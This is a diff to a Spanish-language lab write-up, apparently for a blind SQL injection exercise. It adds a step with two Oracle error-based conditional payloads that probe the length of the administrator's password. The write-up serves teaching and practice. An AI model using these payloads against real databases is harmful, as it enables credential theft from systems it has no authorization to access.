@@ -124,4 +124,15 @@ Si el usuario no existe en la tabla, entonces nunca se ejecutará el select y no
 
 ---
 
+`Paso 4`: Determinar la longitud de la contraseña del usuario `administrator`.
+
+Utilizamos el siguiente payload `' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>1) || '`:
+
+<img width="1904" height="807" alt="image" src="https://github.com/user-attachments/assets/0e28c3b4-267e-41ba-aa28-429f8109735a" />
+
+Ahora probamos con un número más grande, `' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>50) || '`:
+<img width="1888" height="807" alt="image" src="https://github.com/user-attachments/assets/1ad9ea31-7a5f-419a-b66e-066aebd32c99" />
+
+Por lo que hasta ahora sabemos que la contraseña tiene una longitud mayor a 1 y menor a 50.
+
 
